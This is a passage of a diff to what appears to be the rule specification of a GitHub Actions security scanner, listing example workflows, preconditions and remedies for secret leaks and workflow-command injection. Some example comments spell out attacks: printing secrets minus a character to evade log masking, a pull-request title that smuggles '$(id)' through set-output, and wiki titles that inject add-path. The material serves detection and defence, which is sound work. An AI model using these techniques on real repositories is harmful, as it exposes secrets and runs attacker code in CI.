     #   the token without the first character, which the runner does not mask.
@@ -54673,10 +54693,10 @@
   - disposition: todo (needs: same-file)
   - example: writer-function-output.yml (workflow, undetected)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step defines a function f that prints "key:" and the secret GCP_SA_KEY
-    #   without the first character of the secret, and appends the output of f
-    #   to $GITHUB_STEP_SUMMARY through a pipe to cat in a group.
+    # situation: on push, in a public repository (repo.public true), a step
+    #   defines a function f that prints "key:" and the secret GCP_SA_KEY without
+    #   the first character of the secret, and appends the output of f to
+    #   $GITHUB_STEP_SUMMARY through a pipe to cat in a group.
     # reason: a todo (the same file): the group passes the output of f to the
     #   job summary, and the runner does not mask a value made from the secret.
     # cause: the rule reads a pipeline whose last command is a group by every
@@ -54878,11 +54898,10 @@
   - disposition: todo (needs: same-file)
   - example: call-body-unknown.yml (workflow, inconclusive)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step defines a function w that sets PRIVATE_KEY to the private key out
-    #   of the secret GCP_SA_KEY,
-    #   runs a chain of functions f0 to f13 in which each function calls the
-    #   function before it twice (16,383 calls), calls w, and
+    # situation: on push, in a public repository (repo.public true), a step
+    #   defines a function w that sets PRIVATE_KEY to the private key out of the
+    #   secret GCP_SA_KEY, runs a chain of functions f0 to f13 in which each
+    #   function calls the function before it twice (16,383 calls), calls w, and
     #   prints PRIVATE_KEY.
     # reason: the call of w comes after the 4,096 calls of functions that the
     #   rule follows when it reads what the commands of the step print, so the
@@ -54952,9 +54971,9 @@
   - disposition: todo (needs: same-file)
   - example: branch-not-run.yml (workflow, false-positive)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step sets a variable to the private key out of the secret GCP_SA_KEY in
-    #   an if whose condition is false, and prints the variable.
+    # situation: on push, in a public repository (repo.public true), a step sets a
+    #   variable to the private key out of the secret GCP_SA_KEY in an if whose
+    #   condition is false, and prints the variable.
     # reason: bash does not run the branch, so the variable is empty when echo
     #   runs, and the log has no part of the secret.
     # cause: the rule does not read the value of the condition of an if, and
@@ -54979,11 +54998,11 @@
   - disposition: todo (needs: same-file)
   - example: writer-body.yml (workflow, false-positive)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step defines a function f that points the standard output to /dev/null
-    #   with exec and then prints the secret GCP_SA_KEY without the first
-    #   character of the secret, and calls f with an argument, appending the
-    #   standard output of the call to $GITHUB_STEP_SUMMARY.
+    # situation: on push, in a public repository (repo.public true), a step
+    #   defines a function f that points the standard output to /dev/null with
+    #   exec and then prints the secret GCP_SA_KEY without the first character of
+    #   the secret, and calls f with an argument, appending the standard output of
+    #   the call to $GITHUB_STEP_SUMMARY.
     # reason: the exec sends the print to /dev/null, so the job summary gets no
     #   part of the secret.
     # cause: the rule reads what a call of a function with arguments writes
@@ -55009,8 +55028,8 @@
   - disposition: todo (needs: same-file)
   - example: pipeline-descriptor.yml (workflow, false-positive)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step opens file descriptor 3 on /dev/null with exec, and appends to
+    # situation: on push, in a public repository (repo.public true), a step opens
+    #   file descriptor 3 on /dev/null with exec, and appends to
     #   $GITHUB_STEP_SUMMARY, through cat, a line of "key:" and a $( ) in which
     #   exec points the standard output at file descriptor 3 and then an echo
     #   prints the secret GCP_SA_KEY without the first character of the secret.
@@ -55040,11 +55059,11 @@
   - disposition: todo (needs: same-file)
   - example: pipeline-compound.yml (workflow, false-positive)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step appends to $GITHUB_STEP_SUMMARY, through a pipe to cat in a group, a
-    #   line of "key:" and a $( ) in which exec points the standard output to
-    #   /dev/null and then an echo prints the secret GCP_SA_KEY without the first
-    #   character of the secret.
+    # situation: on push, in a public repository (repo.public true), a step
+    #   appends to $GITHUB_STEP_SUMMARY, through a pipe to cat in a group, a line
+    #   of "key:" and a $( ) in which exec points the standard output to /dev/null
+    #   and then an echo prints the secret GCP_SA_KEY without the first character
+    #   of the secret.
     # reason: the exec sends the print to /dev/null, so the $( ) is empty and
     #   the job summary gets no part of the secret.
     # cause: the rule reads a pipeline whose last command is a group by every
@@ -55069,11 +55088,10 @@
   - disposition: todo (needs: same-file)
   - example: failing-pipe-redirect.yml (workflow, false-positive)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step pipes "key:" and the secret GCP_SA_KEY without the first character
-    #   of the secret to cat, whose redirects copy file descriptor 3, which is
-    #   not open, and append to $GITHUB_STEP_SUMMARY, and goes on when cat fails
-    #   (|| true).
+    # situation: on push, in a public repository (repo.public true), a step pipes
+    #   "key:" and the secret GCP_SA_KEY without the first character of the secret
+    #   to cat, whose redirects copy file descriptor 3, which is not open, and
+    #   append to $GITHUB_STEP_SUMMARY, and goes on when cat fails (|| true).
     # reason: the copy of file descriptor 3 fails, so bash does not run cat, and
     #   the job summary gets no part of the secret.
     # cause: the rule reads the last command of the pipeline as writing to the
@@ -55098,11 +55116,11 @@
   - disposition: limitation (decided by: run-time)
   - example: background-write.yml (workflow, false-positive)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step runs in the background (&), with no wait, a subshell that sleeps 5
-    #   seconds and then writes P= and the secret DEPLOY_TOKEN without the first
-    #   character of the secret to $GITHUB_ENV; the shell of the script ends
-    #   before the write; a later step runs.
+    # situation: on push, in a public repository (repo.public true), a step runs
+    #   in the background (&), with no wait, a subshell that sleeps 5 seconds and
+    #   then writes P= and the secret DEPLOY_TOKEN without the first character of
+    #   the secret to $GITHUB_ENV; the shell of the script ends before the write;
+    #   a later step runs.
     # reason: a write that the background command makes after the shell of the
     #   script ends does not reach the steps after the step (seen on the runner
     #   on 2026-11-17), so the header of the later step prints no P.
@@ -55279,7 +55297,7 @@
 - private-repository: a private or internal repository, where the value is secret-in-log.private: whoever may read the repository reads the value
   - finding kinds: secret-in-log.public
   - fact kinds:
-    - repo.public (provider: repo-setting, assumed value: true)
+    - repo.public (provider: repo-setting, answer that removes the finding: false)
   - example: private-repository.yml (workflow, false-positive)
     ```yaml
     # situation: on push, a step prints a substring of the secret DEPLOY_TOKEN,
@@ -55287,8 +55305,9 @@
     # reason: the repository is private or internal, so the value is
     #   secret-in-log.private, not .public: only those with read access, every
     #   member of the enterprise for an internal one, read the log.
-    # cause: the rule takes the repository as public unless a file of facts
-    #   says it is not (repo.public is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the repository is not
+    #   public (repo.public false), the rule reports the finding. When no source
+    #   answers repo.public, the finding is conditional.
     # attack: anyone without access to the repository tries to read the run's
     #   log to take the substring of the token.
     # attack-run-behavior: GitHub does not show the log of a private or
@@ -55362,7 +55381,7 @@
   - cites:
     - <https://github.com/actions/runner/blob/397b032cbf865e9c3ddfab89d533ec19325e1273/src/Runner.Worker/ActionCommandManager.cs>
     - <https://github.com/github/docs/blob/666463860bec200da6c8db9cb9334e7335d9b753/content/actions/reference/workflows-and-actions/workflow-commands.md>
-- precondition readable-log: anyone signed in to GitHub reads the logs of a public repository (repo.public, assumed true), those with read access the logs of a private or internal one, where every member of the enterprise has read access to an internal one, for 90 days by default
+- precondition readable-log: anyone signed in to GitHub reads the logs of a public repository (repo.public true), those with read access the logs of a private or internal one, where every member of the enterprise has read access to an internal one, for 90 days by default
   - cites:
     - <https://github.com/github/docs/blob/ba6f6f9b9b31c4f0a991fbcb1005080526424804/content/actions/how-tos/monitor-workflows/use-workflow-run-logs.md>
     - <https://github.com/github/docs/blob/ba6f6f9b9b31c4f0a991fbcb1005080526424804/data/reusables/actions/about-artifact-log-retention.md>
@@ -56485,7 +56504,7 @@
   - consequence: GitHub passes every secret of the organization and the repository that the job has to the runner of a job of the called workflow that reads the secrets without naming the secrets; a flaw that runs an attacker's code in that job, such as an injection, gives the attacker every one of those secrets, not only the secrets that the called workflow needs
   - remedy: in the called workflow, read each secret by name in place of toJSON(secrets), secrets&#91;&lt;an expression>] or secrets.\*; or declare in on.workflow_call.secrets of the called workflow the secrets that the called workflow reads, and pass those secrets one by one under secrets:
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: inherit-all, nameless-in-called, flaw-in-called
   - true positives:
@@ -56802,7 +56821,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: secrets-inherit.local
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, the job calls
@@ -56816,9 +56835,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: a flaw in deploy.yml runs the code of the attacker in a job of
     #   deploy.yml.
     # attack-run-behavior: the pull request of the attacker triggers
@@ -57056,7 +57076,7 @@
   - consequence: one who may read the repository and fork it, which every member of the enterprise reads for an internal one, can open a pull request that runs their code on the runner, whose state persists for the jobs after it: their secrets, their tokens and the runner's network
   - remedy: turn off Run workflows from fork pull requests, which the rule reads as the fact repo.fork-pr-run-workflows (with the fact false, the rule reports nothing), or run the jobs on GitHub-hosted runners: with a label of a GitHub-hosted runner in runs-on, the rule reports nothing. On self-hosted runners that no pull request from a fork reaches, the rule still reports the job, as the rule reads the labels of runs-on only. An ephemeral runner removes the files and the processes that a job leaves on the machine of the runner before the next job, and the code of a pull request still reaches the network of the runner while the job runs.
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true), repo.allow-forking (provider: repo-setting, assumed value: none), repo.fork-pr-run-workflows (provider: repo-setting, assumed value: none)
+  - fact kinds: repo.public (provider: repo-setting), repo.allow-forking (provider: repo-setting), repo.fork-pr-run-workflows (provider: repo-setting)
   - attackers: fork-pr-author
   - preconditions: reader-fork, pr-workflow, runner-persists
   - true positives:
@@ -57148,7 +57168,7 @@
   - consequence: anyone who opens a pull request can run their code on the runner, whose state persists for the jobs after it: their secrets, their tokens and the runner's network
   - remedy: run the jobs of a public repository on GitHub-hosted runners: with a label of a GitHub-hosted runner in runs-on, the rule reports nothing. An owner of the organization can instead put the self-hosted runners in a runner group that does not allow public repositories: no job of the repository reaches those runners, though the rule still reports the job, as the rule reads the labels of runs-on only (the false positive form group-access). An ephemeral runner removes the files and the processes that a job leaves on the machine of the runner before the next job, and the code of a pull request still reaches the network of the runner while the job runs.
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting)
   - attackers: fork-pr-author
   - preconditions: public-repo, pr-workflow, runner-persists
   - incidents: pytorch-2023
@@ -57158,8 +57178,7 @@
       # situation: on push, a job calls
       #   example-org/self-hosted-workflow/.github/workflows/build.yml@v1, a
       #   reusable workflow of another repository whose job runs on a runner
-      #   labelled self-hosted and linux, in a public repository (repo.public,
-      #   assumed true).
+      #   labelled self-hosted and linux, in a public repository (repo.public true).
       # reason: the jobs of a called workflow run on the runners of the
       #   repository that calls it, so the repository has a self-hosted runner
       #   with both labels; workflow.definition answers the file of the called
@@ -57177,9 +57196,8 @@
       ```
     - public.yml (workflow, true-positive)
       ```yaml
-      # situation: on pull_request, a job runs make on a runner labelled
-      #   self-hosted and linux, in a public repository (repo.public, assumed
-      #   true).
+      # situation: on pull_request, a job runs make on a runner labelled self-hosted
+      #   and linux, in a public repository (repo.public true).
       # reason: on pull_request, GitHub runs the workflow file as the pull request
       #   has it, so the author of a pull request from a fork can rewrite the
       #   steps, and runs-on: [self-hosted, linux] sends them to the repository's
@@ -57491,15 +57509,16 @@
 - private-repository: a private or internal repository, which not anyone forks: one who may read it and fork it is self-hosted-runner.private
   - finding kinds: self-hosted-runner.public
   - fact kinds:
-    - repo.public (provider: repo-setting, assumed value: true)
+    - repo.public (provider: repo-setting, answer that removes the finding: false)
   - example: private-repository.yml (workflow, false-positive)
     ```yaml
     # situation: a pull request runs the job on a self-hosted runner.
     # reason: the repository is private or internal, so not anyone forks it and
     #   opens a pull request: one who may read it and fork it is
     #   self-hosted-runner.private.
-    # cause: the rule takes the repository as public unless a file of facts says
-    #   it is not (repo.public is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the repository is not
+    #   public (repo.public false), the rule reports the finding. When no source
+    #   answers repo.public, the finding is conditional.
     # attack: the attacker becomes a contributor (in pytorch-2023, by a typo fix
     #   that was merged), then opens a pull request from a fork whose copy of
     #   this workflow runs a step of their own in place of make.
@@ -57612,7 +57631,7 @@
     - <https://github.com/github/docs/blob/8b39dc44a066dda794bfacdd25653ff86324ef21/content/repositories/creating-and-managing-repositories/about-repositories.md>
     - <https://github.com/github/docs/blob/8b39dc44a066dda794bfacdd25653ff86324ef21/data/reusables/actions/private-repository-forks-overview.md>
     - <https://github.com/github/docs/blob/8b39dc44a066dda794bfacdd25653ff86324ef21/content/repositories/creating-and-managing-repositories/about-repositories.md#about-internal-repositories>
-- precondition public-repo: the repository is public, so anyone forks it and opens a pull request (repo.public, assumed true); by default, the run of a first-time contributor's pull request waits for approval, a contributor's does not; a credential whose only write access is to the permission Actions can approve the run (the endpoint POST /repos/{owner}/{repo}/actions/runs/{run_id}/approve), and the credential premise keeps the holder of such a credential as a possible attacker
+- precondition public-repo: the repository is public, so anyone forks it and opens a pull request (repo.public true); by default, the run of a first-time contributor's pull request waits for approval, a contributor's does not; a credential whose only write access is to the permission Actions can approve the run (the endpoint POST /repos/{owner}/{repo}/actions/runs/{run_id}/approve), and the credential premise keeps the holder of such a credential as a possible attacker
   - cites:
     - <https://docs.github.com/en/actions/reference/security/secure-use#hardening-for-self-hosted-runners>
     - <https://docs.github.com/en/actions/how-tos/manage-workflow-runs/approve-runs-from-forks>
@@ -57763,7 +57782,7 @@
   - consequence: with or without ACTIONS_ALLOW_UNSECURE_COMMANDS, the runner reads a line that the step prints, when the line holds ##&#91;set-output name=NAME;]value or starts with ::set-output, as a command that sets the output NAME of the step; the runner sets the outputs of a step only when the step has an id; the steps after the step, and the outputs of the job and of an action that name the output, get the value of the attacker as the output of the step, and a step that writes \${{ steps.&lt;id>.outputs.NAME }} into its run script runs code of the attacker
   - remedy: do not print the value to the log; if the value must be printed, print the value only between ::stop-commands::TOKEN and ::TOKEN::, where TOKEN is a value the step chooses at random for each run (the rule does not read stop-commands and keeps reporting the step: a known false positive, stopped-commands)
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks
   - preconditions: log-set-output, attacker-event, callers-events, app-status-check
   - true positives:
@@ -59590,7 +59609,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: set-output-injection.controlled
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, the step p, which has an id, prints the
@@ -59605,9 +59624,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: the author of a pull request from a fork titles the pull request x
     #   ##[set-output name=tag;]$(id).
     # attack-run-behavior: the pull request of the attacker triggers
@@ -59802,7 +59822,7 @@
   - cites:
     - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_call>
     - <https://github.com/advisories/GHSA-7x29-qqmq-v6qc>
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -59917,7 +59937,7 @@
   - consequence: the runner masks only whole secrets, and a value taken out of a secret is not a whole secret. When a step has such a value in its env, with or run, the runner prints the value unmasked in the header of the step, before the step runs. When a container has such a value in its env, or in the username of its credentials, the runner prints the value unmasked in the docker commands that the runner prints at the start of the job, before any step runs. Whoever has read access to the repository reads the value in the log, which is kept for 90 days by default
   - remedy: store each value in a secret of its own, secrets.NAME; delete the logs that have it and rotate it
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting)
   - attackers: log-reader
   - preconditions: part-unmasked, header-printed, command-printed, output-kept, readable-log
   - true positives:
@@ -60036,16 +60056,16 @@
   - consequence: the runner masks only whole secrets, and a value taken out of a secret is not a whole secret. When a step has such a value in its env, with or run, the runner prints the value unmasked in the header of the step, before the step runs. When a container has such a value in its env, or in the username of its credentials, the runner prints the value unmasked in the docker commands that the runner prints at the start of the job, before any step runs. Anyone signed in to GitHub reads the value in the log, which is kept for 90 days by default
   - remedy: store each value in a secret of its own, secrets.NAME; delete the logs that have it and rotate it
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting)
   - attackers: log-reader
   - preconditions: part-unmasked, header-printed, command-printed, output-kept, readable-log
   - true positives:
     - public.case-output.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true),
-      #   an output of the job `read` is the whole secret TOKEN on the main branch
-      #   and the password of the JSON secret DB on other branches; the later job
-      #   `print` prints the output.
+      # situation: on push, in a public repository (repo.public true), an output of
+      #   the job `read` is the whole secret TOKEN on the main branch and the
+      #   password of the JSON secret DB on other branches; the later job `print`
+      #   prints the output.
       # reason: on a branch other than main, the output has only the password,
       #   which the runner does not mask, so the runner keeps the output and the
       #   job `print` prints the password in the header of its step.
@@ -60071,10 +60091,10 @@
       ```
     - public.container.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true),
-      #   the container of the job `build` takes the user out of the JSON secret
-      #   REGISTRY into the username of its credentials, and the API key out of
-      #   the JSON secret CONFIG into its env.
+      # situation: on push, in a public repository (repo.public true), the container
+      #   of the job `build` takes the user out of the JSON secret REGISTRY into the
+      #   username of its credentials, and the API key out of the JSON secret CONFIG
+      #   into its env.
       # reason: the runner masks REGISTRY and CONFIG whole, not the values that
       #   fromJSON takes out of them, and the runner prints the docker login
       #   command with the username and the docker create command with the env at
@@ -60102,9 +60122,9 @@
       ```
     - public.env-json.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   job puts the JSON secret DB in its env, and a step takes the password
-      #   out of the env with fromJSON into the env of the step.
+      # situation: on push, in a public repository (repo.public true), a job puts
+      #   the JSON secret DB in its env, and a step takes the password out of the
+      #   env with fromJSON into the env of the step.
       # reason: env.DB is the value of the secret DB; the runner masks DB whole,
       #   not the password that fromJSON takes out of DB, and prints the env of
       #   the step in the header of the step before the step runs.
@@ -60126,9 +60146,9 @@
       ```
     - public.job-output.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true),
-      #   an output of the job `read` takes the password out of the JSON secret
-      #   DB, and the later job `print` prints the output.
+      # situation: on push, in a public repository (repo.public true), an output of
+      #   the job `read` takes the password out of the JSON secret DB, and the later
+      #   job `print` prints the output.
       # reason: the runner masks DB whole, not the password that fromJSON takes
       #   out of DB, so the runner keeps the output, and the job `print` prints
       #   the password in the header of its step before the step runs.
@@ -60154,9 +60174,9 @@
       ```
     - public.same-run.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true),
-      #   the env of the job has the password of the JSON secret DB under
-      #   PASSWORD, and the run of a step writes env.PASSWORD twice.
+      # situation: on push, in a public repository (repo.public true), the env of
+      #   the job has the password of the JSON secret DB under PASSWORD, and the run
+      #   of a step writes env.PASSWORD twice.
       # reason: the runner prints the env of the job and the run with each ${{ }}
       #   evaluated in the header of the step, and the runner does not mask the
       #   password that fromJSON takes out of DB.
@@ -60176,9 +60196,9 @@
       ```
     - public.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step takes clientId and clientSecret out of the JSON secret
-      #   AZURE_CREDENTIALS into its env.
+      # situation: on push, in a public repository (repo.public true), a step takes
+      #   clientId and clientSecret out of the JSON secret AZURE_CREDENTIALS into
+      #   its env.
       # reason: the runner masks AZURE_CREDENTIALS whole, not the values fromJSON
       #   takes out of it, and prints the step's env in its header before it
       #   runs, so the client secret is in the log as it is.
@@ -61265,7 +61285,7 @@
 - private-repository: a private or internal repository, where the value is unmasked-secret-exposure.private: whoever may read the repository reads it
   - finding kinds: unmasked-secret-exposure.public
   - fact kinds:
-    - repo.public (provider: repo-setting, assumed value: true)
+    - repo.public (provider: repo-setting, answer that removes the finding: false)
   - example: private-repository.yml (workflow, false-positive)
     ```yaml
     # situation: on push, a step takes the client secret out of the JSON
@@ -61274,8 +61294,9 @@
     #   unmasked-secret-exposure.private, not .public: only those with read
     #   access, every member of the enterprise for an internal one, read the
     #   log.
-    # cause: the rule takes the repository as public unless a file of facts
-    #   says it is not (repo.public is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the repository is not
+    #   public (repo.public false), the rule reports the finding. When no source
+    #   answers repo.public, the finding is conditional.
     # attack: anyone without access to the repository tries to read the run's
     #   log to take the client secret.
     # attack-run-behavior: GitHub does not show the log of a private or
@@ -61352,7 +61373,7 @@
   - observed: 2026-10-23, runner 2.337.0: an output of a job with the value of the key pass of a JSON secret, taken out by fromJSON, printed only the name of the output in that job; a later job that read the output with needs printed the value of pass unmasked in the env and the run of the headers of its steps; an output with a value that a step of its job registered with ::add-mask:: was dropped, and the later job got an empty value
   - cites:
     - <https://github.com/actions/runner/blob/397b032cbf865e9c3ddfab89d533ec19325e1273/src/Runner.Worker/JobExtension.cs>
-- precondition readable-log: anyone signed in to GitHub reads the logs of a public repository (repo.public, assumed true), those with read access the logs of a private or internal one, where every member of the enterprise has read access to an internal one, for 90 days by default
+- precondition readable-log: anyone signed in to GitHub reads the logs of a public repository (repo.public true), those with read access the logs of a private or internal one, where every member of the enterprise has read access to an internal one, for 90 days by default
   - cites:
     - <https://github.com/github/docs/blob/ba6f6f9b9b31c4f0a991fbcb1005080526424804/content/actions/how-tos/monitor-workflows/use-workflow-run-logs.md>
     - <https://github.com/github/docs/blob/ba6f6f9b9b31c4f0a991fbcb1005080526424804/data/reusables/actions/about-artifact-log-retention.md>
@@ -62351,7 +62372,7 @@
   - consequence: the runner reads a line of the output that holds ##&#91;set-env name=NAME;]value, or starts with ::set-env, as a command that sets the environment variable NAME of the steps after the step; a set-env of BASH_ENV makes the bash of each step after the step run code of the attacker, and an add-path puts a directory of the attacker before the PATH of the steps after the step
   - remedy: rewrite the steps that print set-env or add-path commands to write \$GITHUB_ENV and \$GITHUB_PATH instead, then remove ACTIONS_ALLOW_UNSECURE_COMMANDS; if the flag must stay, print values an attacker controls only between ::stop-commands::TOKEN and ::TOKEN::, where TOKEN is a value the step chooses at random for each run (the rule does not read stop-commands and keeps reporting the step)
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks
   - preconditions: unsecure-flag, bash-env, path-lookup, attacker-executable, attacker-event, callers-events, app-status-check
   - true positives:
@@ -62646,7 +62667,7 @@
   - consequence: the runner reads a line of the output that holds ##&#91;add-path]DIR anywhere in the line, or that starts with ::add-path::DIR, as a command that puts the directory DIR before the PATH of the steps after the step, so that an executable of the attacker in DIR runs in place of the program that a step after the step calls by name; the title ##&#91;add path]DIR of a wiki page makes the name ##&#91;add-path]DIR, and the title ::add path::DIR makes the name ::add-path::DIR
   - remedy: rewrite the steps that print set-env or add-path commands to write \$GITHUB_ENV and \$GITHUB_PATH instead, then remove ACTIONS_ALLOW_UNSECURE_COMMANDS; if the flag must stay, print values an attacker controls only between ::stop-commands::TOKEN and ::TOKEN::, where TOKEN is a value the step chooses at random for each run (the rule does not read stop-commands and keeps reporting the step)
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.wiki-open (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.wiki-open (provider: repo-setting)
   - attackers: wiki-editor
   - preconditions: unsecure-flag, path-lookup, attacker-executable, attacker-event, callers-events, wiki-open
   - true positives:
@@ -62656,13 +62677,13 @@
       #   in its env, and a step prints the name of the wiki page (page_name); a
       #   step comes after.
       # reason: anyone may edit the wiki when the wiki is open to all
-      #   (repo.wiki-open, assumed true). For a page made on the web interface,
-      #   GitHub makes the name of the page from the title, turns each blank of
-      #   the title into a - after trimming the blanks at the head and the end of
-      #   the title, and turns each - that the editor writes in the title
-      #   into the character U+2010, so the title ::add path::/tmp/x makes the
-      #   name ::add-path::/tmp/x, and the runner reads a printed line that starts
-      #   with ::add-path:: as a command where the flag is true.
+      #   (repo.wiki-open true). For a page made on the web interface, GitHub makes
+      #   the name of the page from the title, turns each blank of the title into a
+      #   - after trimming the blanks at the head and the end of the title, and
+      #   turns each - that the editor writes in the title into the character
